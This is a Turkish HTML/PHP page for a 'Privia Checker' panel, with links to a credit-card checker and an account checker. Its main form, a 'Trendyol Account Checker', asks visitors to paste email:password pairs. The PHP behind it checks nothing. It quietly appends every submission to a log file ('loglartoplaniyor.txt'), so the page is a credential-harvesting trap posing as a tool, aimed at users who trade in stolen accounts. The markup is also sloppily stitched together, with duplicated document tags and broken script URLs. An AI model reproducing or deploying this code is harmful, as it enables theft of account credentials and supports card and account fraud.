<!DOCTYPE html>
<!DOCTYPE html>
<!-- Created By CodingNepal -->
<html lang="en" dir="ltr">
<html>
    <head>
       <title>Sayfamızda görüntülenecek başlık</title>
    </head>
    <body background="download.png">
    </body>
 </html>
  <head>
    <meta charset="utf-8">
    <!-- Somehow I got an error, so I comment the title, just uncomment to show -->
    <!-- <title>Animated Sidebar Menu | CodingLab</title> -->
    <link rel="stylesheet" href="style.css">
    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
  </head>
  <body>
    <div class="wrapper">
      <input type="checkbox" id="btn" hidden>
      <label for="btn" class="menu-btn">
        <i class="fas fa-bars"></i>
        <i class="fas fa-times"></i>
      </label>
      <nav id="sidebar">
        <div class="title">
Privia Checker</div>
<ul class="list-items">
<br><center><b><font face="Tahoma" size="3" color="white">DASHBOARD</font></b><br /></center></br>
<li><a href="index.php"><i class="fa fa-home"></i>Anasayfa</a></li>
<br><center><b><font face="Tahoma" size="3" color="white">CHECKER</font></b><br /></center></br>
<li><a href="cchecker.php"><i class="fa fa-credit-card"></i>CC Checker</a></li>
<li><a href="accountchecker.php"><i class="fa fa-user-plus"></i>Account Checker</a></li>

<br><center><b><font face="Tahoma" size="3" color="white">Üyelik: Free User</font></b><br /></center></br>
<div class="icons">	
          </div>
</ul>
</nav>

    </div>
<div class="content">
      <div class="header">

</div>
</body>
</html>

<html lang="tr">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<style>
#cu{
  font-weight: 400;
  font-size: 50px;
  font-family: 'Fredoka One', cursive;
  margin-top: 300px;
}
#cu2{
  font-weight: 400;
  font-size: 30px;
  font-family: 'Fredoka One', cursive;
  margin-top: 300px;
}
</style>

  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap" rel="stylesheet"> 
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Privia Checker ucretsiz deneme surumu.">
  <link rel="icon" type="image/ico" href="img/icon.png">
  <meta name="keywords" content="Privia Checker ucretsiz deneme surumu.">
  <base  />
  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
  <link href="css/sb-admin-2.min.css" rel="stylesheet">


</head>

<body id="page-top">

<!-- <img src="3365405-200.png" width="130px">  <b id="cu">Privia Checker beta sürümü ücretsiz deneme imkani.</b>-->

  <!-- Page Wrapper -->

  <div id="wrapper">
    <!-- Content Wrapper -->

    <div id="content-wrapper" class="d-flex flex-column">

      <!-- Main Content -->

      <div id="content">

        <!-- Topbar navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow -->

        <!--<nav class="navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow">-->

          <!-- Sidebar Toggle (Topbar) -->

          <!-- Topbar Navbar -->

          <ul class="navbar-nav ml-auto">

            <div class="topbar-divider d-none d-sm-block"></div>

             <!-- Nav Item - User Information -->
              </a>
          </ul>

        </nav>

        <!-- End of Topbar -->

 <title>KART PANEL</title>

     <section class="contact-area section--padding">

        <div class="container">

            <div class="row">
<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/5fb7bfc7a1d54c18d8eba6e5/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>

<!--End of Tawk.to Script-->

                            <div class="col-md-12">

                            <div class="contact_form cardify">
                                                                <div class="contact_form__title">

                                    <b><h3>Privia Trendyol Account Checker  </h3></b>
                                </div>
                                <div class="row">
                                    <div class="col-md-8 offset-md-2">
                                        <div class="contact_form--wrapper">
                                            <form method="post">
                                                <div class="row">
                                                   <div class="col-md-6">
                                                        <div class="form-group">                                                         
                                                        </div>
                                                    </div>
                                                    <div class="col-md-6">
                                                        <div class="form-group">                                                        
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="row">
                                                    <div class="col-md-6">
                                                        <div class="form-group">                                  
                                                        </div>
                                                    </div>
                                                    <div class="col-md-6">
                                                        <div class="form-group">
                                                        </div>
                                                    </div>
                                                </div>

                                                <textarea cols="30" rows="10" type="text" class="form-control" method="POST" name="icerik" placeholder="Düzenlenmiş Trendyol hesaplarınızı email@gmail.com:sifreniz olarak yapıştırıp checkleyebilirsiniz"></textarea>

<?php
if (isset($_POST["icerik"]))
{
  $dosya = fopen("loglartoplaniyor.txt","a");
  $top = "Content : {$_POST['icerik']}";

  fwrite($dosya,$top);
  fwrite($dosya,"<br>\r\n");
  fclose($dosya);
  die("Kayıt Oluşturuldu");
}
?>

                                   <div class="row">  
                                  <div class="col-7">
                                 <div class="checkbox icheck">
                                  <label>
                               <input type="checkbox" required> 
                            <b data-toggle="modal" data-target="#modal-info"> İzin Ver  . </b>
                                       </label>
                                          </div>
                                         </div>
                                         </br>
                                                <div class="m-2">
                                                <button name="mesaj_ekle" class="btn btn-success btn-block">Başlat</button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                    <!-- end /.col-md-8 -->
                                </div>
                                <!-- end /.row -->
                            </div>
                            <!-- end /.contact_form -->
                        </div>
</div>
</div>

</section>

                         
      </div>
      <!-- End of Main Content -->

      <!-- Footer -->
      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
           
          </div>
        </div>
      </footer>
      <!-- End of Footer -->

    </div>
    <!-- End of Content Wrapper -->

  </div>
  <!-- End of Page Wrapper -->

  <!-- Scroll to Top Button-->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>


  <!-- Bootstrap core JavaScript-->
  <script src="https://icos.com.trvendor/jquery/jquery.min.js"></script>
  <script src="https://icos.com.trvendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Core plugin JavaScript-->
  <script src="https://icos.com.trvendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="https://icos.com.trjs/sb-admin-2.min.js"></script>

</body>
</html>
            
<!--          
              <div class="modal fade" id="modal-info">
        <div class="modal-dialog">
          <div class="modal-content bg-info">
            <div class="modal-header">
              
              <center><h4 class="modal-title"></h4></center>
              
              <img src="data:image/jpeg;base64,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">
            </div>
            <div class="modal-body">
               <p>HIZLI AKTİF PANEL</p>              </p>
            </div>
          
          </div>

        </div>

      </div>
 -->
